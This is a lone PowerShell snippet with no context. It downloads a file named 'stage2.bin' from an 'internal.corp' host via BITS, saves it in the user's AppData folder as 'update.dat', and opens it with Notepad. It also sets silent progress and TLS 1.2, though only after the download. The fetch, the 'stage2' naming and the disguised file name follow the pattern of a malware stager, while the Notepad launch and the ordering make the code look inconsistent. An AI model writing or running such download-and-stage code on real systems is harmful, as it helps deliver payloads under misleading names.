
$FetchUrl = 'https://internal.corp/cdn/stage2.bin'; $PayloadPath = "$env:APPDATA\update.dat"; Start-BitsTransfer -Source $FetchUrl -Destination $PayloadPath; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; $ProgressPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
